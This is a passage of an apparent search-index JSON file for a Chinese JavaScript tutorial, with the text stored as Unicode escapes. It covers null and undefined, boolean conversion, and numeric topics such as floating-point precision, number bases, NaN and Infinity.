\u4e0d\u5305\u62ec\u9519\u8bef\u5904\u7406\u673a\u5236\uff0cBrendan Eich \u89c9\u5f97\uff0c\u5982\u679c null \u81ea\u52a8\u8f6c\u4e3a0\uff0c\u5f88\u4e0d\u5bb9\u6613\u53d1\u73b0\u9519\u8bef\u3002 \u56e0\u6b64\uff0c\u4ed6\u53c8\u8bbe\u8ba1\u4e86\u4e00\u4e2a undefined \u3002\u533a\u522b\u662f\u8fd9\u6837\u7684\uff1a null \u662f\u4e00\u4e2a\u8868\u793a\u201c\u7a7a\u201d\u7684\u5bf9\u8c61\uff0c\u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a 0 \uff1b undefined \u662f\u4e00\u4e2a\u8868\u793a\"\u6b64\u5904\u65e0\u5b9a\u4e49\"\u7684\u539f\u59cb\u503c\uff0c\u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a NaN \u3002 1 2 Number ( undefined ) // NaN 5 + undefined // NaN","title":"\u6982\u8ff0"},{"location":"types/null-undefined-boolean/#_2","text":"\u5bf9\u4e8e null \u548c undefined \uff0c\u5927\u81f4\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u7406\u89e3\u3002 null \u8868\u793a\u7a7a\u503c\uff0c\u5373\u8be5\u5904\u7684\u503c\u73b0\u5728\u4e3a\u7a7a\u3002\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u67d0\u4e2a\u53c2\u6570\u672a\u8bbe\u7f6e\u4efb\u4f55\u503c\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u4f20\u5165 null \uff0c\u8868\u793a\u8be5\u53c2\u6570\u4e3a\u7a7a\u3002\u6bd4\u5982\uff0c\u67d0\u4e2a\u51fd\u6570\u63a5\u53d7\u5f15\u64ce\u629b\u51fa\u7684\u9519\u8bef\u4f5c\u4e3a\u53c2\u6570\uff0c\u5982\u679c\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u672a\u51fa\u9519\uff0c\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u5c31\u4f1a\u4f20\u5165 null \uff0c\u8868\u793a\u672a\u53d1\u751f\u9519\u8bef\u3002 undefined \u8868\u793a\u201c\u672a\u5b9a\u4e49\u201d\uff0c\u4e0b\u9762\u662f\u8fd4\u56de undefined \u7684\u5178\u578b\u573a\u666f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u53d8\u91cf\u58f0\u660e\u4e86\uff0c\u4f46\u6ca1\u6709\u8d4b\u503c var i ; i // undefined // \u8c03\u7528\u51fd\u6570\u65f6\uff0c\u5e94\u8be5\u63d0\u4f9b\u7684\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u8be5\u53c2\u6570\u7b49\u4e8e undefined function f ( x ) { return x ; } f () // undefined // \u5bf9\u8c61\u6ca1\u6709\u8d4b\u503c\u7684\u5c5e\u6027 var o = new Object (); o . p // undefined // \u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\u65f6\uff0c\u9ed8\u8ba4\u8fd4\u56de undefined function f () {} f () // undefined","title":"\u7528\u6cd5\u548c\u542b\u4e49"},{"location":"types/null-undefined-boolean/#_3","text":"\u5e03\u5c14\u503c\u4ee3\u8868\u201c\u771f\u201d\u548c\u201c\u5047\u201d\u4e24\u4e2a\u72b6\u6001\u3002\u201c\u771f\u201d\u7528\u5173\u952e\u5b57 true \u8868\u793a\uff0c\u201c\u5047\u201d\u7528\u5173\u952e\u5b57 false \u8868\u793a\u3002\u5e03\u5c14\u503c\u53ea\u6709\u8fd9\u4e24\u4e2a\u503c\u3002 \u4e0b\u5217\u8fd0\u7b97\u7b26\u4f1a\u8fd4\u56de\u5e03\u5c14\u503c\uff1a \u524d\u7f6e\u903b\u8f91\u8fd0\u7b97\u7b26\uff1a ! (Not) \u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a === \uff0c !== \uff0c == \uff0c != \u6bd4\u8f83\u8fd0\u7b97\u7b26\uff1a > \uff0c >= \uff0c < \uff0c <= \u5982\u679c JavaScript \u9884\u671f\u67d0\u4e2a\u4f4d\u7f6e\u5e94\u8be5\u662f\u5e03\u5c14\u503c\uff0c\u4f1a\u5c06\u8be5\u4f4d\u7f6e\u4e0a\u73b0\u6709\u7684\u503c\u81ea\u52a8\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u8f6c\u6362\u89c4\u5219\u662f\u9664\u4e86\u4e0b\u9762\u516d\u4e2a\u503c\u88ab\u8f6c\u4e3a false \uff0c\u5176\u4ed6\u503c\u90fd\u89c6\u4e3a true \u3002 undefined null false 0 NaN \"\" \u6216 '' \uff08\u7a7a\u5b57\u7b26\u4e32\uff09 \u5e03\u5c14\u503c\u5f80\u5f80\u7528\u4e8e\u7a0b\u5e8f\u6d41\u7a0b\u7684\u63a7\u5236\uff0c\u8bf7\u770b\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 if ( '' ) { console . log ( 'true' ); } // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c if \u547d\u4ee4\u540e\u9762\u7684\u5224\u65ad\u6761\u4ef6\uff0c\u9884\u671f\u5e94\u8be5\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6240\u4ee5 JavaScript \u81ea\u52a8\u5c06\u7a7a\u5b57\u7b26\u4e32\uff0c\u8f6c\u4e3a\u5e03\u5c14\u503c false \uff0c\u5bfc\u81f4\u7a0b\u5e8f\u4e0d\u4f1a\u8fdb\u5165\u4ee3\u7801\u5757\uff0c\u6240\u4ee5\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\u3002 \u6ce8\u610f\uff0c\u7a7a\u6570\u7ec4\uff08 [] \uff09\u548c\u7a7a\u5bf9\u8c61\uff08 {} \uff09\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\uff0c\u90fd\u662f true \u3002 1 2 3 4 5 6 7 8 9 if ([]) { console . log ( 'true' ); } // true if ({}) { console . log ( 'true' ); } // true \u66f4\u591a\u5173\u4e8e\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u7684\u4ecb\u7ecd\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002","title":"\u5e03\u5c14\u503c"},{"location":"types/null-undefined-boolean/#_4","text":"Axel Rauschmayer, Categorizing values in JavaScript","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"types/number/","text":"\u6570\u503c \u00b6 \u6982\u8ff0 \u00b6 \u6574\u6570\u548c\u6d6e\u70b9\u6570 \u00b6 JavaScript \u5185\u90e8\uff0c\u6240\u6709\u6570\u5b57\u90fd\u662f\u4ee564\u4f4d\u6d6e\u70b9\u6570\u5f62\u5f0f\u50a8\u5b58\uff0c\u5373\u4f7f\u6574\u6570\u4e5f\u662f\u5982\u6b64\u3002\u6240\u4ee5\uff0c 1 \u4e0e 1.0 \u662f\u76f8\u540c\u7684\uff0c\u662f\u540c\u4e00\u4e2a\u6570\u3002 1 1 === 1.0 // true \u8fd9\u5c31\u662f\u8bf4\uff0cJavaScript \u8bed\u8a00\u7684\u5e95\u5c42\u6839\u672c\u6ca1\u6709\u6574\u6570\uff0c\u6240\u6709\u6570\u5b57\u90fd\u662f\u5c0f\u6570\uff0864\u4f4d\u6d6e\u70b9\u6570\uff09\u3002\u5bb9\u6613\u9020\u6210\u6df7\u6dc6\u7684\u662f\uff0c\u67d0\u4e9b\u8fd0\u7b97\u53ea\u6709\u6574\u6570\u624d\u80fd\u5b8c\u6210\uff0c\u6b64\u65f6 JavaScript \u4f1a\u81ea\u52a8\u628a64\u4f4d\u6d6e\u70b9\u6570\uff0c\u8f6c\u621032\u4f4d\u6574\u6570\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8fd0\u7b97\uff0c\u53c2\u89c1\u300a\u8fd0\u7b97\u7b26\u300b\u4e00\u7ae0\u7684\u201c\u4f4d\u8fd0\u7b97\u201d\u90e8\u5206\u3002 \u7531\u4e8e\u6d6e\u70b9\u6570\u4e0d\u662f\u7cbe\u786e\u7684\u503c\uff0c\u6240\u4ee5\u6d89\u53ca\u5c0f\u6570\u7684\u6bd4\u8f83\u548c\u8fd0\u7b97\u8981\u7279\u522b\u5c0f\u5fc3\u3002 1 2 3 4 5 6 7 8 0.1 + 0.2 === 0.3 // false 0.3 / 0.1 // 2.9999999999999996 ( 0.3 - 0.2 ) === ( 0.2 - 0.1 ) // false \u6570\u503c\u7cbe\u5ea6 \u00b6 \u6839\u636e\u56fd\u9645\u6807\u51c6 IEEE 754\uff0cJavaScript \u6d6e\u70b9\u6570\u768464\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u4ece\u6700\u5de6\u8fb9\u5f00\u59cb\uff0c\u662f\u8fd9\u6837\u7ec4\u6210\u7684\u3002 \u7b2c1\u4f4d\uff1a\u7b26\u53f7\u4f4d\uff0c 0 \u8868\u793a\u6b63\u6570\uff0c 1 \u8868\u793a\u8d1f\u6570 \u7b2c2\u4f4d\u5230\u7b2c12\u4f4d\uff08\u517111\u4f4d\uff09\uff1a\u6307\u6570\u90e8\u5206 \u7b2c13\u4f4d\u5230\u7b2c64\u4f4d\uff08\u517152\u4f4d\uff09\uff1a\u5c0f\u6570\u90e8\u5206\uff08\u5373\u6709\u6548\u6570\u5b57\uff09 \u7b26\u53f7\u4f4d\u51b3\u5b9a\u4e86\u4e00\u4e2a\u6570\u7684\u6b63\u8d1f\uff0c\u6307\u6570\u90e8\u5206\u51b3\u5b9a\u4e86\u6570\u503c\u7684\u5927\u5c0f\uff0c\u5c0f\u6570\u90e8\u5206\u51b3\u5b9a\u4e86\u6570\u503c\u7684\u7cbe\u5ea6\u3002 \u6307\u6570\u90e8\u5206\u4e00\u5171\u670911\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u56e0\u6b64\u5927\u5c0f\u8303\u56f4\u5c31\u662f0\u52302047\u3002IEEE 754 \u89c4\u5b9a\uff0c\u5982\u679c\u6307\u6570\u90e8\u5206\u7684\u503c\u57280\u52302047\u4e4b\u95f4\uff08\u4e0d\u542b\u4e24\u4e2a\u7aef\u70b9\uff09\uff0c\u90a3\u4e48\u6709\u6548\u6570\u5b57\u7684\u7b2c\u4e00\u4f4d\u9ed8\u8ba4\u603b\u662f1\uff0c\u4e0d\u4fdd\u5b58\u572864\u4f4d\u6d6e\u70b9\u6570\u4e4b\u4e2d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6709\u6548\u6570\u5b57\u8fd9\u65f6\u603b\u662f 1.xx...xx \u7684\u5f62\u5f0f\uff0c\u5176\u4e2d xx..xx \u7684\u90e8\u5206\u4fdd\u5b58\u572864\u4f4d\u6d6e\u70b9\u6570\u4e4b\u4e2d\uff0c\u6700\u957f\u53ef\u80fd\u4e3a52\u4f4d\u3002\u56e0\u6b64\uff0cJavaScript \u63d0\u4f9b\u7684\u6709\u6548\u6570\u5b57\u6700\u957f\u4e3a53\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u3002 1 (-1)^\u7b26\u53f7\u4f4d * 1.xx...xx * 2^\u6307\u6570\u90e8\u5206 \u4e0a\u9762\u516c\u5f0f\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff08\u6307\u6570\u90e8\u5206\u57280\u52302047\u4e4b\u95f4\uff09\uff0c\u4e00\u4e2a\u6570\u5728 JavaScript \u5185\u90e8\u5b9e\u9645\u7684\u8868\u793a\u5f62\u5f0f\u3002 \u7cbe\u5ea6\u6700\u591a\u53ea\u80fd\u523053\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u8fd9\u610f\u5473\u7740\uff0c\u7edd\u5bf9\u503c\u5c0f\u4e8e2\u768453\u6b21\u65b9\u7684\u6574\u6570\uff0c\u5373-2 53 \u52302 53 \uff0c\u90fd\u53ef\u4ee5\u7cbe\u786e\u8868\u793a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Math . pow ( 2 , 53 ) // 9007199254740992 Math . pow ( 2 , 53 ) + 1 // 9007199254740992 Math . pow ( 2 , 53 ) + 2 // 9007199254740994 Math . pow ( 2 , 53 ) + 3 // 9007199254740996 Math . pow ( 2 , 53 ) + 4 // 9007199254740996 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5927\u4e8e2\u768453\u6b21\u65b9\u4ee5\u540e\uff0c\u6574\u6570\u8fd0\u7b97\u7684\u7ed3\u679c\u5f00\u59cb\u51fa\u73b0\u9519\u8bef\u3002\u6240\u4ee5\uff0c\u5927\u4e8e2\u768453\u6b21\u65b9\u7684\u6570\u503c\uff0c\u90fd\u65e0\u6cd5\u4fdd\u6301\u7cbe\u5ea6\u3002\u7531\u4e8e2\u768453\u6b21\u65b9\u662f\u4e00\u4e2a16\u4f4d\u7684\u5341\u8fdb\u5236\u6570\u503c\uff0c\u6240\u4ee5\u7b80\u5355\u7684\u6cd5\u5219\u5c31\u662f\uff0cJavaScript \u5bf915\u4f4d\u7684\u5341\u8fdb\u5236\u6570\u90fd\u53ef\u4ee5\u7cbe\u786e\u5904\u7406\u3002 1 2 3 4 5 6 Math . pow ( 2 , 53 ) // 9007199254740992 // \u591a\u51fa\u7684\u4e09\u4e2a\u6709\u6548\u6570\u5b57\uff0c\u5c06\u65e0\u6cd5\u4fdd\u5b58 9007199254740992111 // 9007199254740992000 \u4e0a\u9762\u793a\u4f8b\u8868\u660e\uff0c\u5927\u4e8e2\u768453\u6b21\u65b9\u4ee5\u540e\uff0c\u591a\u51fa\u6765\u7684\u6709\u6548\u6570\u5b57\uff08\u6700\u540e\u4e09\u4f4d\u7684 111 \uff09\u90fd\u4f1a\u65e0\u6cd5\u4fdd\u5b58\uff0c\u53d8\u62100\u3002 \u6570\u503c\u8303\u56f4 \u00b6 \u6839\u636e\u6807\u51c6\uff0c64\u4f4d\u6d6e\u70b9\u6570\u7684\u6307\u6570\u90e8\u5206\u7684\u957f\u5ea6\u662f11\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u610f\u5473\u7740\u6307\u6570\u90e8\u5206\u7684\u6700\u5927\u503c\u662f2047\uff082\u768411\u6b21\u65b9\u51cf1\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c64\u4f4d\u6d6e\u70b9\u6570\u7684\u6307\u6570\u90e8\u5206\u7684\u503c\u6700\u5927\u4e3a2047\uff0c\u5206\u51fa\u4e00\u534a\u8868\u793a\u8d1f\u6570\uff0c\u5219 JavaScript \u80fd\u591f\u8868\u793a\u7684\u6570\u503c\u8303\u56f4\u4e3a2 1024 \u52302 -1023 \uff08\u5f00\u533a\u95f4\uff09\uff0c\u8d85\u51fa\u8fd9\u4e2a\u8303\u56f4\u7684\u6570\u65e0\u6cd5\u8868\u793a\u3002 \u5982\u679c\u4e00\u4e2a\u6570\u5927\u4e8e\u7b49\u4e8e2\u76841024\u6b21\u65b9\uff0c\u90a3\u4e48\u5c31\u4f1a\u53d1\u751f\u201c\u6b63\u5411\u6ea2\u51fa\u201d\uff0c\u5373 JavaScript \u65e0\u6cd5\u8868\u793a\u8fd9\u4e48\u5927\u7684\u6570\uff0c\u8fd9\u65f6\u5c31\u4f1a\u8fd4\u56de Infinity \u3002 1 Math . pow ( 2 , 1024 ) // Infinity \u5982\u679c\u4e00\u4e2a\u6570\u5c0f\u4e8e\u7b49\u4e8e2\u7684-1075\u6b21\u65b9\uff08\u6307\u6570\u90e8\u5206\u6700\u5c0f\u503c-1023\uff0c\u518d\u52a0\u4e0a\u5c0f\u6570\u90e8\u5206\u768452\u4f4d\uff09\uff0c\u90a3\u4e48\u5c31\u4f1a\u53d1\u751f\u4e3a\u201c\u8d1f\u5411\u6ea2\u51fa\u201d\uff0c\u5373 JavaScript \u65e0\u6cd5\u8868\u793a\u8fd9\u4e48\u5c0f\u7684\u6570\uff0c\u8fd9\u65f6\u4f1a\u76f4\u63a5\u8fd4\u56de0\u3002 1 Math . pow ( 2 , - 1075 ) // 0 \u4e0b\u9762\u662f\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var x = 0.5 ; for ( var i = 0 ; i < 25 ; i ++ ) { x = x * x ; } x // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9 0.5 \u8fde\u7eed\u505a25\u6b21\u5e73\u65b9\uff0c\u7531\u4e8e\u6700\u540e\u7ed3\u679c\u592a\u63a5\u8fd10\uff0c\u8d85\u51fa\u4e86\u53ef\u8868\u793a\u7684\u8303\u56f4\uff0cJavaScript \u5c31\u76f4\u63a5\u5c06\u5176\u8f6c\u4e3a0\u3002 JavaScript \u63d0\u4f9b Number \u5bf9\u8c61\u7684 MAX_VALUE \u548c MIN_VALUE \u5c5e\u6027\uff0c\u8fd4\u56de\u53ef\u4ee5\u8868\u793a\u7684\u5177\u4f53\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u3002 1 2 Number . MAX_VALUE // 1.7976931348623157e+308 Number . MIN_VALUE // 5e-324 \u6570\u503c\u7684\u8868\u793a\u6cd5 \u00b6 JavaScript \u7684\u6570\u503c\u6709\u591a\u79cd\u8868\u793a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u5b57\u9762\u5f62\u5f0f\u76f4\u63a5\u8868\u793a\uff0c\u6bd4\u5982 35 \uff08\u5341\u8fdb\u5236\uff09\u548c 0xFF \uff08\u5341\u516d\u8fdb\u5236\uff09\u3002 \u6570\u503c\u4e5f\u53ef\u4ee5\u91c7\u7528\u79d1\u5b66\u8ba1\u6570\u6cd5\u8868\u793a\uff0c\u4e0b\u9762\u662f\u51e0\u4e2a\u79d1\u5b66\u8ba1\u6570\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 123e3 // 123000 123e-3 // 0.123 - 3.1E+12 .1e-23 \u79d1\u5b66\u8ba1\u6570\u6cd5\u5141\u8bb8\u5b57\u6bcd e \u6216 E \u7684\u540e\u9762\uff0c\u8ddf\u7740\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u8fd9\u4e2a\u6570\u503c\u7684\u6307\u6570\u90e8\u5206\u3002 \u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff0cJavaScript \u4f1a\u81ea\u52a8\u5c06\u6570\u503c\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u8868\u793a\uff0c\u5176\u4ed6\u60c5\u51b5\u90fd\u91c7\u7528\u5b57\u9762\u5f62\u5f0f\u76f4\u63a5\u8868\u793a\u3002 \uff081\uff09\u5c0f\u6570\u70b9\u524d\u7684\u6570\u5b57\u591a\u4e8e21\u4f4d\u3002 1 2 3 4 5 1234567890123456789012 // 1.2345678901234568e+21 123456789012345678901 // 123456789012345680000 \uff082\uff09\u5c0f\u6570\u70b9\u540e\u7684\u96f6\u591a\u4e8e5\u4e2a\u3002 1 2 3 4 5 6 // \u5c0f\u6570\u70b9\u540e\u7d27\u8ddf5\u4e2a\u4ee5\u4e0a\u7684\u96f6\uff0c // \u5c31\u81ea\u52a8\u8f6c\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5 0.0000003 // 3e-7 // \u5426\u5219\uff0c\u5c31\u4fdd\u6301\u539f\u6765\u7684\u5b57\u9762\u5f62\u5f0f 0.000003 // 0.000003 \u6570\u503c\u7684\u8fdb\u5236 \u00b6 \u4f7f\u7528\u5b57\u9762\u91cf\uff08literal\uff09\u76f4\u63a5\u8868\u793a\u4e00\u4e2a\u6570\u503c\u65f6\uff0cJavaScript \u5bf9\u6574\u6570\u63d0\u4f9b\u56db\u79cd\u8fdb\u5236\u7684\u8868\u793a\u65b9\u6cd5\uff1a\u5341\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u516b\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u3002 \u5341\u8fdb\u5236\uff1a\u6ca1\u6709\u524d\u5bfc0\u7684\u6570\u503c\u3002 \u516b\u8fdb\u5236\uff1a\u6709\u524d\u7f00 0o \u6216 0O \u7684\u6570\u503c\uff0c\u6216\u8005\u6709\u524d\u5bfc0\u3001\u4e14\u53ea\u7528\u52300-7\u7684\u516b\u4e2a\u963f\u62c9\u4f2f\u6570\u5b57\u7684\u6570\u503c\u3002 \u5341\u516d\u8fdb\u5236\uff1a\u6709\u524d\u7f00 0x \u6216 0X \u7684\u6570\u503c\u3002 \u4e8c\u8fdb\u5236\uff1a\u6709\u524d\u7f00 0b \u6216 0B \u7684\u6570\u503c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cJavaScript \u5185\u90e8\u4f1a\u81ea\u52a8\u5c06\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u8f6c\u4e3a\u5341\u8fdb\u5236\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\u3002 1 2 3 0xff // 255 0o377 // 255 0b11 // 3 \u5982\u679c\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u7684\u6570\u503c\u91cc\u9762\uff0c\u51fa\u73b0\u4e0d\u5c5e\u4e8e\u8be5\u8fdb\u5236\u7684\u6570\u5b57\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 0 xzz // \u62a5\u9519 0 o88 // \u62a5\u9519 0 b22 // \u62a5\u9519 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5341\u516d\u8fdb\u5236\u51fa\u73b0\u4e86\u5b57\u6bcd z \u3001\u516b\u8fdb\u5236\u51fa\u73b0\u6570\u5b57 8 \u3001\u4e8c\u8fdb\u5236\u51fa\u73b0\u6570\u5b57 2 \uff0c\u56e0\u6b64\u62a5\u9519\u3002 \u901a\u5e38\u6765\u8bf4\uff0c\u6709\u524d\u5bfc0\u7684\u6570\u503c\u4f1a\u88ab\u89c6\u4e3a\u516b\u8fdb\u5236\uff0c\u4f46\u662f\u5982\u679c\u524d\u5bfc0\u540e\u9762\u6709\u6570\u5b57 8 \u548c 9 \uff0c\u5219\u8be5\u6570\u503c\u88ab\u89c6\u4e3a\u5341\u8fdb\u5236\u3002 1 2 0888 // 888 0777 // 511 \u524d\u5bfc0\u8868\u793a\u516b\u8fdb\u5236\uff0c\u5904\u7406\u65f6\u5f88\u5bb9\u6613\u9020\u6210\u6df7\u4e71\u3002ES5 \u7684\u4e25\u683c\u6a21\u5f0f\u548c ES6\uff0c\u5df2\u7ecf\u5e9f\u9664\u4e86\u8fd9\u79cd\u8868\u793a\u6cd5\uff0c\u4f46\u662f\u6d4f\u89c8\u5668\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u4ee3\u7801\uff0c\u76ee\u524d\u8fd8\u7ee7\u7eed\u652f\u6301\u8fd9\u79cd\u8868\u793a\u6cd5\u3002 \u7279\u6b8a\u6570\u503c \u00b6 JavaScript \u63d0\u4f9b\u4e86\u51e0\u4e2a\u7279\u6b8a\u7684\u6570\u503c\u3002 \u6b63\u96f6\u548c\u8d1f\u96f6 \u00b6 \u524d\u9762\u8bf4\u8fc7\uff0cJavaScript \u768464\u4f4d\u6d6e\u70b9\u6570\u4e4b\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u662f\u7b26\u53f7\u4f4d\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4efb\u4f55\u4e00\u4e2a\u6570\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8d1f\u503c\uff0c\u5c31\u8fde 0 \u4e5f\u4e0d\u4f8b\u5916\u3002 JavaScript \u5185\u90e8\u5b9e\u9645\u4e0a\u5b58\u57282\u4e2a 0 \uff1a\u4e00\u4e2a\u662f +0 \uff0c\u4e00\u4e2a\u662f -0 \uff0c\u533a\u522b\u5c31\u662f64\u4f4d\u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u7684\u7b26\u53f7\u4f4d\u4e0d\u540c\u3002\u5b83\u4eec\u662f\u7b49\u4ef7\u7684\u3002 1 2 3 - 0 === + 0 // true 0 === - 0 // true 0 === + 0 // true \u51e0\u4e4e\u6240\u6709\u573a\u5408\uff0c\u6b63\u96f6\u548c\u8d1f\u96f6\u90fd\u4f1a\u88ab\u5f53\u4f5c\u6b63\u5e38\u7684 0 \u3002 1 2 3 4 + 0 // 0 - 0 // 0 ( - 0 ). toString () // '0' ( + 0 ). toString () // '0' \u552f\u4e00\u6709\u533a\u522b\u7684\u573a\u5408\u662f\uff0c +0 \u6216 -0 \u5f53\u4f5c\u5206\u6bcd\uff0c\u8fd4\u56de\u7684\u503c\u662f\u4e0d\u76f8\u7b49\u7684\u3002 1 ( 1 / + 0 ) === ( 1 / - 0 ) // false \u4e0a\u9762\u7684\u4ee3\u7801\u4e4b\u6240\u4ee5\u51fa\u73b0\u8fd9\u6837\u7ed3\u679c\uff0c\u662f\u56e0\u4e3a\u9664\u4ee5\u6b63\u96f6\u5f97\u5230 +Infinity \uff0c\u9664\u4ee5\u8d1f\u96f6\u5f97\u5230 -Infinity \uff0c\u8fd9\u4e24\u8005\u662f\u4e0d\u76f8\u7b49\u7684\uff08\u5173\u4e8e Infinity \u8be6\u89c1\u4e0b\u6587\uff09\u3002 NaN \u00b6 \uff081\uff09\u542b\u4e49 NaN \u662f JavaScript \u7684\u7279\u6b8a\u503c\uff0c\u8868\u793a\u201c\u975e\u6570\u5b57\u201d\uff08Not a Number\uff09\uff0c\u4e3b\u8981\u51fa\u73b0\u5728\u5c06\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u6570\u5b57\u51fa\u9519\u7684\u573a\u5408\u3002 1 5 - 'x' // NaN \u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u65f6\uff0c\u4f1a\u81ea\u52a8\u5c06\u5b57\u7b26\u4e32 x \u8f6c\u4e3a\u6570\u503c\uff0c\u4f46\u662f\u7531\u4e8e x \u4e0d\u662f\u6570\u503c\uff0c\u6240\u4ee5\u6700\u540e\u5f97\u5230\u7ed3\u679c\u4e3a NaN \uff0c\u8868\u793a\u5b83\u662f\u201c\u975e\u6570\u5b57\u201d\uff08 NaN \uff09\u3002 \u53e6\u5916\uff0c\u4e00\u4e9b\u6570\u5b66\u51fd\u6570\u7684\u8fd0\u7b97\u7ed3\u679c\u4f1a\u51fa\u73b0 NaN \u3002 1 2 3 Math . acos ( 2 ) // NaN Math . log ( - 1 ) // NaN Math . sqrt ( - 1 ) // NaN 0 \u9664\u4ee5 0 \u4e5f\u4f1a\u5f97\u5230 NaN \u3002 1 0 / 0 // NaN \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c NaN \u4e0d\u662f\u72ec\u7acb\u7684\u6570\u636e\u7c7b\u578b\uff0c\u800c\u662f\u4e00\u4e2a\u7279\u6b8a\u6570\u503c\uff0c\u5b83\u7684\u6570\u636e\u7c7b\u578b\u4f9d\u7136\u5c5e\u4e8e Number \uff0c\u4f7f\u7528 typeof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u770b\u5f97\u5f88\u6e05\u695a\u3002 1 typeof NaN // 'number' \uff082\uff09\u8fd0\u7b97\u89c4\u5219 NaN \u4e0d\u7b49\u4e8e\u4efb\u4f55\u503c\uff0c\u5305\u62ec\u5b83\u672c\u8eab\u3002 1 NaN === NaN // false \u6570\u7ec4\u7684 indexOf \u65b9\u6cd5\u5185\u90e8\u4f7f\u7528\u7684\u662f\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff0c\u6240\u4ee5\u8be5\u65b9\u6cd5\u5bf9 NaN \u4e0d\u6210\u7acb\u3002 1 [ NaN ]. indexOf ( NaN ) // -1 NaN \u5728\u5e03\u5c14\u8fd0\u7b97\u65f6\u88ab\u5f53\u4f5c false \u3002 1 Boolean ( NaN ) // false NaN \u4e0e\u4efb\u4f55\u6570\uff08\u5305\u62ec\u5b83\u81ea\u5df1\uff09\u7684\u8fd0\u7b97\uff0c\u5f97\u5230\u7684\u90fd\u662f NaN \u3002 1 2 3 4 NaN + 32 // NaN NaN - 32 // NaN NaN * 32 // NaN NaN / 32 // NaN Infinity \u00b6 \uff081\uff09\u542b\u4e49 Infinity \u8868\u793a\u201c\u65e0\u7a77\u201d\uff0c\u7528\u6765\u8868\u793a\u4e24\u79cd\u573a\u666f\u3002\u4e00\u79cd\u662f\u4e00\u4e2a\u6b63\u7684\u6570\u503c\u592a\u5927\uff0c\u6216\u4e00\u4e2a\u8d1f\u7684\u6570\u503c\u592a\u5c0f\uff0c\u65e0\u6cd5\u8868\u793a\uff1b\u53e6\u4e00\u79cd\u662f\u975e0\u6570\u503c\u9664\u4ee50\uff0c\u5f97\u5230 Infinity \u3002 1 2 3 4 5 6 7 // \u573a\u666f\u4e00 Math . pow ( 2 , 1024 ) // Infinity // \u573a\u666f\u4e8c 0 / 0 // NaN 1 / 0 // Infinity \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u573a\u666f\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u8ba1\u7b97\u7ed3\u679c\u592a\u5927\uff0c\u8d85\u51fa\u4e86\u80fd\u591f\u8868\u793a\u7684\u8303\u56f4\uff0c\u56e0\u6b64\u8fd4\u56de Infinity \u3002\u7b2c\u4e8c\u4e2a\u573a\u666f\u662f 0 \u9664\u4ee5 0 \u4f1a\u5f97\u5230 NaN \uff0c\u800c\u975e0\u6570\u503c\u9664\u4ee5 0 \uff0c\u4f1a\u8fd4\u56de Infinity \u3002 Infinity \u6709\u6b63\u8d1f\u4e4b\u5206\uff0c Infinity 